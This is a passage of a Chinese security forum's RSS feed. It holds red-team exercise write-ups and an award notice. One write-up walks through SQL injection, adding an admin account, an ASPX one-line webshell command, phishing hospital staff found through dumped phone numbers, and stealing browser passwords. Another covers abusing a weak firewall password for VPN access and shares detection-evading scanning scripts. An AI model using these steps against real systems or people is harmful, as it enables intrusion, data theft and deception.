&lt;p&gt;&lt;a href=&quot;https://github.com/projectsend/projectsend/releases/tag/r1720&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectsend/projectsend/releases/tag/r1720&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;0x010 免责声明&lt;/h2&gt;
&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;本文所涉及的任何技术、信息或工具，仅供学习和参考之用。&lt;/p&gt;
 
&lt;p&gt;请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。&lt;/p&gt;
 
&lt;p&gt;作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;</description><link>https://zone.huoxian.cn/d/2961-ndayprojectsend-cve-2024-11680</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2961-ndayprojectsend-cve-2024-11680</guid><pubDate>Sun, 01 Dec 2024 06:02:59 GMT</pubDate><author>jylove</author><category>漏洞复现</category><category>应用安全</category><category>安全运营</category></item><item><title>近期某省级HVV实战回忆录</title><description>&lt;h3&gt;前言&lt;/h3&gt;
&lt;p&gt;先说明一下，部分图片打码严重，&lt;strong&gt;怕漏点儿&lt;/strong&gt;，部分截图为工具缓存截图&lt;br&gt;
近期又结束了一个HVV，有点儿心力憔悴，最后成绩还行吧，起码在周期内还当了几天的“榜一大哥”，这次记录的是其中一个很有意思的靶标，靶标是YL行业的，对于YL行业的靶标开展攻击思路大致分为三个步骤&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;互联网网站控制服务器然后横向&lt;/li&gt;
&lt;li&gt;钓鱼进入内网，但是需要突破隔离网，因为控制的终端并不一定是处于业务内网以及核心网&lt;/li&gt;
&lt;li&gt;近源攻击，但是本次的规则中明确提出禁止近源。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;当然如果是公有云服务器的话，我们能利用的信息可以集中靶标单位内部的资料信息，对社工的来说的话成功率比较高；或者利用某些接口：类似于短信接口或者邮件接口下发文件钓鱼等等。&lt;/p&gt;

&lt;h3&gt;入口1&lt;/h3&gt;

&lt;p&gt;前期的信息搜集的话不介绍了，靶标单位的公众号以及小程序等的接口基本上都测试过了，确实没发现问题，如果说真的有洞的话只能说我们比较菜，确实没找到突破口，但是再子域名解析下ip地址的c段找到了一个.net语言开发的网站，功能比较简单，甚至没有后台（在控制之后发现是站库分离，后端在内网的另外一台机子上）。看到的第一点都感觉有注入，简单手工注入测试就找到了注入点。（下面的图片为报告内的部分截图打码以及sqlmap的部分缓存）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608520-848886-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;查看ip地址为私网172段，切当前用户为system权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608539-676945-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;查询网络连接状态&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608558-922280-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;了解到当前内网的网段有18和16段。查询当前进程并没有发现任何杀软，执行命令添加用户并且加入管理员用户组&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608589-750357-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;直接添加成功，到这里是不是以为直接起飞了，执行执行命令certutil上线完事儿了&lt;/p&gt;

&lt;h4&gt;第一个没想到&lt;/h4&gt;

&lt;p&gt;死活上线不了，我一直以为是不是杀软的原因，powershell啥的乱七八糟的上线方式都尝试一遍了，一般除了ZW的站来说，互联网映射的一般都可以出网，甚至DMZ区的机器都能出网，本来以为会很顺利，这台机器竟然不出网，这是让我没想到的，ping了dns直接不通，这次真的草率了！！！！！！！！！！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608611-374207-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;咨询了一堆朋友，尝试了乱七八糟的各种姿势，我竟然一开始就固定思维默认这台机子出网了，真想赏自己俩面条，因为上线问题搞了俩钟头，，，，，，，，，，，&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608724-963812-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;因为不出网，所以下一步的操作根本无法执行&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;工具无法上传&lt;/li&gt;
&lt;li&gt;内网无法横向，甚至windows的机器也无法密码喷洒&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;于是想起了第二种方式来继续利用这个shell，&lt;strong&gt;写webshell端口转发+RDP&lt;/strong&gt;。到这里心态又恢复了。&lt;/p&gt;

&lt;h4&gt;第二个没想到&lt;/h4&gt;

&lt;p&gt;本来以为写webshell这么简单，我的权限还是system权限，写shell那不是给我送机器么。令我没想到的是执行命令只要涉及到中文路径，统统报错，What？涉及中文路径就报错。真的裂开了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608763-569448-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;不过没关系，这时候经常写webshell的老哥肯定想到，完全可以查询web路径然后写入webshell。顶多也就是时间问题了，没关系，因为我觉得这个系统必定跟HIS等的系统有关联，瞬间心里信心又回来了。&lt;/p&gt;

&lt;p&gt;命令惠存&lt;/p&gt;

&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;for /r C:\ %i in (xxx.aspx) do echo %i&amp;gt; %i..\path1.txt&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;

&lt;p&gt;费劲扒拉的跑了半小时，找到了路径&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608789-479293-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;访问web界面的txt&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608813-215524-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;突然感觉又行了。ahhh，接下来就是写webshell，浅浅测试一下txt，发现txt完全没问题。写简单的一句话&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608832-984166-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;cmd /c &quot;d: &amp;amp; echo ^&amp;lt;%eval request(\&quot;chopper\&quot;)%^&amp;gt; &amp;gt; \a.aspx&quot;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;

&lt;p&gt;当然这个命令完全没问题，注意windos的注入是需要防止转义的。又经过了费劲巴拉写进去了。发现a.aspx也写进去了，访问回显代码&lt;strong&gt;401&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608852-825973-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;裂开了，白忙活一场，webshell写入了，回显401。前期写shell回显404&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608869-447212-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;试错的成本太高了，&lt;strong&gt;告别了写不进入的404迎来了401&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;入口2&lt;/h3&gt;

&lt;p&gt;前面的方法耗时耗精力，脑补了太多的结发，webshell死活也写不进去。开始脑补社工行不行，开始sql注入进行dump数据&lt;/p&gt;

&lt;p&gt;进行爆库，爆表，爆字段&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608888-798667-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608906-774174-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这里可能有同志觉得web业务有了，其实不然，字段内的密码全为加盐的md5，没一个能解的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608932-532634-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;有通用密码，但是确实猜不到。但是里面的字段有&lt;strong&gt;手机号&lt;/strong&gt;，然后结合公众号的互联网医院查询了挂号医生，确认了数据是没有问题的。那么尝试钓鱼试试了。&lt;/p&gt;

&lt;h4&gt;第三个没想到&lt;/h4&gt;

&lt;p&gt;本来就是不抱希望的进行钓鱼，因为一般微信直接添加好友询问内容可信度是不高的，但结果出乎我的意料，直接添加成功，询问的自然点儿是没有问题的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608952-859867-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;但是比较裂开的是，马子死活不上线&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608974-208572-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;我测试了确实也是免杀的，究竟是什么奇葩原因。我再忐忑究竟是不是因为我VPS被情报社区打标签了。于是开始直接开启&lt;strong&gt;不要脸模式&lt;/strong&gt;，社工老师直接开的&lt;strong&gt;向日葵便携版&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732608994-954043-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609014-710894-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;向日葵，真香呀！！！！&lt;/p&gt;

&lt;h4&gt;第四个没想到&lt;/h4&gt;

&lt;p&gt;上来直接退出某数字杀软，上线了CS改版的原生马子，没有问题，解释不了免杀马为什么双击上线不了，都是64位操作机，玄学问题。&lt;/p&gt;

&lt;p&gt;solo一波机器的浏览器记录以及存贮的账号密码后面备着用，但是没有YL的核心系统，毕竟HIS登录需要Ukey没办法，但是服务器的段是没有问题的，互联网出口的那台机器必定处于核心网。&lt;/p&gt;

&lt;p&gt;NPS隧道打起来，端口转发3389，&lt;strong&gt;因为直接连接出口服务器的内网的3389同样无法连接。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609045-351957-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;端口转发出口的那台机子的3389是成功的，因为同时转发了web业务端口，测试是没有问题的，并且再xp_cmdshell下开启RDP，但是3389&lt;strong&gt;无法转发成功&lt;/strong&gt;，白添加用户了。真是白瞎了添加的用户。本来我在想是不是端口的问题，使用命令更换RDP端口&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;reg add &quot;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3388 /f&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重启RDP服务&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;net start TermService&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;依旧无法转发成功。只有一种可能性&lt;strong&gt;网闸&lt;/strong&gt;的原因。&lt;/p&gt;

&lt;h3&gt;利用社工机横向&lt;/h3&gt;

&lt;p&gt;无法利用就直接用社工机器横向，内网禁ping，solo工具Fscan扫描也只能使用参数&lt;code&gt;-np&lt;/code&gt;，比较慢，扫描内网发现有其它业务服务器，其中发现另一个服务器有业务同样有注入。&lt;/p&gt;

&lt;p&gt;同样的方式如法炮制，我感觉又行了，没想到这台机子同样无法出网。机器的环境类似，无杀软但是又system权限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609079-902079-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;就打了几台打印机，获取了部分数据无了。这个时候感觉没戏了。&lt;/p&gt;

&lt;h3&gt;入口3&lt;/h3&gt;

&lt;p&gt;还是不想死心，上面三台机器可能同时一个科室的，尝试能不能社工一台其它科室的机器，还是利用上面dump出的手机号，社工另外一名老师&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609110-737030-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;okkk，直接开开搞，&lt;strong&gt;只要接电话接的够自信，别人永远不会质疑你&lt;/strong&gt;，比较幸运的是这个老师有事情给我推了另外一个老师，有中间人介绍这种情况下的信任是最牢固的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609128-541876-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;某主任的电脑出网是跟上面的老师聊天出网的。&lt;/p&gt;

&lt;h4&gt;第五个没想到（转折）&lt;/h4&gt;

&lt;p&gt;主任的终端果然是&lt;strong&gt;双网卡&lt;/strong&gt;，太香了！！！！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609146-231150-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;主任的机器上有&lt;strong&gt;inode&lt;/strong&gt;，连接上Inode后走的锐捷的代理，这时候出口服务器的RDP可以连了，内网获取多台服务器和数据库，服务器分可能不够，但是核心服务器和数据库拿下了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609160-36528-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-11-26/1732609176-446349-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;第六个没想到&lt;/h4&gt;

&lt;p&gt;这里为什么能获取多个太服务器，服务器口令确实一致这是没错的，但是内网密码喷洒一点儿效果也没，另我没想到的是，服务器的RDP的端口被动过。&lt;/p&gt;

&lt;p&gt;举个例子&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.1.1.130:1300为RDP
1.1.1.150:1500为RDP&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;好家伙，让我一顿猜！！！&lt;/p&gt;

&lt;h3&gt;总结&lt;/h3&gt;

&lt;p&gt;这个靶标真的真实我了，真就一个离谱，拐的弯路真多！！！！&lt;/p&gt;

</description><link>https://zone.huoxian.cn/d/2960-hvv</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2960-hvv</guid><pubDate>Tue, 26 Nov 2024 08:20:42 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>火线Zone 24年10月技术文章奖励公示</title><description>&lt;h1&gt;火线Zone 24年10月技术文章奖励公示&lt;/h1&gt;

&lt;p&gt;亲爱的火线Zone社区成员们，&lt;/p&gt;

&lt;p&gt;自火线Zone征稿奖励方案启动以来，我们收到了众多技术专家的杰出投稿。这些高质量的原创技术文章不仅丰富了我们的社区知识库，也极大地促进了安全技术的交流与分享。在此，我们对所有积极参与的创作者表示衷心的感谢，并希望激励更多的技术专家加入我们的行列，共同推动技术安全生态的繁荣发展。&lt;/p&gt;

&lt;h3&gt;优秀文章奖&lt;/h3&gt;

&lt;p&gt;经过严格的审核流程，以下文章凭借其深度分析和独到见解，荣获“精华文章奖”，各获得&lt;strong&gt;100查克拉积分 + 1000RMB&lt;/strong&gt;的奖励：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2958-firewall&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;近期红队实战：出口FireWall助力突破靶标&lt;/a&gt; 作者：和&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;基础投稿奖&lt;/h3&gt;

&lt;p&gt;以下文章也通过了我们的审核，符合基础投稿奖励要求，每位作者将获得&lt;strong&gt;50查克拉积分&lt;/strong&gt;的奖励：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2950-shiro&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;奇葩环境之shiro 反序列化漏洞&lt;/a&gt; 作者：反派&lt;/li&gt;
&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2954-jndi&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;JNDI注入 漏洞工具使用和对比&lt;/a&gt; 作者：jylove&lt;/li&gt;
&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2955-waf&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;雷池WAF自动化实现安全运营实操案例终极篇&lt;/a&gt; 作者：Fariy&lt;/li&gt;
&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2956&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;重生之我在推特逛漏洞&lt;/a&gt; 作者：jylove&lt;/li&gt;
&lt;li&gt;**&lt;a href=&quot;https://zone.huoxian.cn/d/2957-5k&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;记录灯塔收集学校信息，攻击薄弱点站点，拿到5K+的敏感信息&lt;/a&gt; 作者：火线用户0c9b05&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;奖励发放说明&lt;/h3&gt;

&lt;ul&gt;&lt;li&gt;所有获得奖励的文章将同步发表在&lt;strong&gt;火线Zone&lt;/strong&gt;公众号上，以飨更广泛的读者群体。&lt;/li&gt;
&lt;li&gt;奖励将在每月的第一周统一发放，涵盖上月投稿的所有合格文章。请获奖者留意自己的火线安全平台账户。&lt;/li&gt;
&lt;li&gt;如对奖励有任何异议或疑问，请及时联系&lt;strong&gt;火线小助手&lt;/strong&gt;。&lt;/li&gt;&lt;/ul&gt;

&lt;h3&gt;内容征集及奖励方案详情&lt;/h3&gt;

&lt;p&gt;我们诚邀更多的技术专家加入火线Zone社区，共同构建技术安全生态。更多内容征集及奖励方案详情请访问：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2891-zone-24&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;火线Zone社区规则升级，共建技术安全生态&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;结语&lt;/h3&gt;

&lt;p&gt;火线Zone社区对每一位创作者的辛勤工作和贡献表示最深的敬意。我们期待在未来的日子里，继续与您携手合作，共同书写技术安全的新篇章。&lt;/p&gt;

&lt;p&gt;再次感谢所有支持火线Zone的朋友们！&lt;/p&gt;

&lt;p&gt;火线Zone社区团队  &lt;br&gt;
2024年10月&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;&lt;strong&gt;版权声明：&lt;/strong&gt; 本文内容由火线Zone社区原创发布，未经允许，不得转载或用于商业用途。如需转载，请遵守&lt;a href=&quot;https://zone.huoxian.cn/d/2891-zone-24&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;转载说明&lt;/a&gt;中的相关规定。&lt;/p&gt;
</description><link>https://zone.huoxian.cn/d/2959-zone-2410</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2959-zone-2410</guid><pubDate>Wed, 06 Nov 2024 03:23:47 GMT</pubDate><author>智能安全助手</author><category>官方公告</category></item><item><title>近期红队实战：出口FireWall助力突破靶标</title><description>&lt;h4&gt;前言&lt;/h4&gt;

&lt;p&gt;最近实在忙，也没时间写文章了，妥妥的纯牛马。部的HVV刚结束，调休还没来得及用，没想到各地市的HVV接着拉开了帷幕，这次总成果都还不错，名次也不错，这次的案例也值得分享一下。目标单位之一规模很大，也比较有钱，安全方面的预算据了解到的也比较足，所以整体上这家单位觉得还是比较难拿下的，但是比较有意思的是今年的红队也和去年的一场红队一样，同样突破后是出口墙。&lt;/p&gt;

&lt;h4&gt;防火墙SSLVPN配置&lt;/h4&gt;

&lt;p&gt;弱口令登录DP防火墙直接开始配置&lt;/p&gt;

&lt;h5&gt;全局配置&lt;/h5&gt;

&lt;p&gt;需要勾选开启SSL VPN服务器，等配置完成后访问IP+6443即可访问VPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258393-338317-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;IP地址池配置&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;此配置无需修改，使用默认即可，后期SSLvpn给客户端分配的地址池，其它选项无需配置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258477-265584-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;资源管理&lt;/h5&gt;

&lt;ul&gt;&lt;li&gt;资源配置&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;配置VPN的资源，这里仅需要配置&lt;strong&gt;IP资源配置&lt;/strong&gt;和&lt;strong&gt;资源组配置&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258509-919346-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;资源组配置&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;在资源组配置中添加资源配置添加的几个地址段&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258590-77202-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Tips&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;这里资源组配置的时候添加的地址段为组网配置的的接口内网地址段&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258627-470939-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;用户管理&lt;/h5&gt;

&lt;ul&gt;&lt;li&gt;用户配置&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258654-940617-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;添加用户成功后即可使用添加的用户进行vpn配置登录了，登录之后即可获取到资源列表&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258679-409220-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258697-789174-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;内网横向&lt;/h4&gt;

&lt;h6&gt;探测内网业务段&lt;/h6&gt;

&lt;p&gt;由于根据防火墙接口了解内网网段情况，直接进行都目标段的信息搜集和扫描。为了规避安全设备的感知，这里我使用的ai协助先把主机明探测了一遍，方便了解各个地址段所处的网络状态。&lt;/p&gt;

&lt;p&gt;这里探测主机由于需要规避安全设备，需要考虑两点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;避免使用ICMP协议。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;防止局域网内禁ping协议开启&lt;/p&gt;

&lt;p&gt;防止速度过快导致设备告警，当然不同的设备在捕获到ICMP协议的告警端口不一致，比如某服的SIP端口为0，某3的端口为2048等。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;尽可能使用UDP协议&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;udp扫描一般使用的比较少，大多数的扫描工具扫描一般使用的是TCP协议。&lt;/p&gt;

&lt;p&gt;这里我使用UDP协议暂时使用137端口进行主机主机名探测，探测到主机名和具体的ip地址段后再针对不用的业务进行批量的漏洞扫描&lt;/p&gt;

&lt;p&gt;这里分享脚本：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import subprocess
import time
import random
import ipaddress

def get_hosts_with_names(ip_range):
    network = ipaddress.ip_network(ip_range, strict=False)
    ip_list = list(network.hosts())
    random.shuffle(ip_list)  # 随机化 IP 列表

    for ip in ip_list:
        try:
            result = subprocess.run([&#39;nbtstat&#39;, &#39;-A&#39;, str(ip)], capture_output=True, text=True, check=True)
            if &quot;UNIQUE&quot; in result.stdout:
                print(f&quot;Host: {ip}&quot;)
                print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f&quot;Error occurred while scanning {ip}: {e}&quot;)
        
        # 随机延迟在 10ms 到 2 秒之间
        delay = random.uniform(0.01, 2)
        time.sleep(delay)

def main():
    ip_range = input(&quot;Enter the CIDR network range (e.g., 192.168.1.0/24): &quot;)
    get_hosts_with_names(ip_range)

if __name__ == &quot;__main__&quot;:
    main()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;时间比较慢，效果还不错，间隔时间越久效果越OK。但是之后建议使用nbtscan配合python脚本使用，时间间隔随机数尽可能的放的更更长以及对增加对7680以及1024等其它物业端口进行遍历扫描。这些端口在今年24年HVV行动中一些厂商设备的误报的基础上建议增加的，更容易规避被发现的风险。文件过大输出到文档中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258731-263318-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258755-83763-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;基本上根据扫描的结果可以大概的分析出目标的单位的网络图谱情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258788-479516-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h6&gt;探测办公网打印机&lt;/h6&gt;

&lt;p&gt;找到业务办公网这里可以仅针对打印机端口UDP端口9100扫描&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import socket
import time
import random
import ipaddress

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # 设置超时时间为1秒
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        print(f&quot;Error scanning {ip}:{port} - {e}&quot;)
        return False

def main():
    cidr = input(&quot;Enter the CIDR (e.g., 10.1.1.1/8): &quot;)
    
    try:
        network = ipaddress.ip_network(cidr, strict=False)
    except ValueError as e:
        print(f&quot;Invalid CIDR: {e}&quot;)
        return

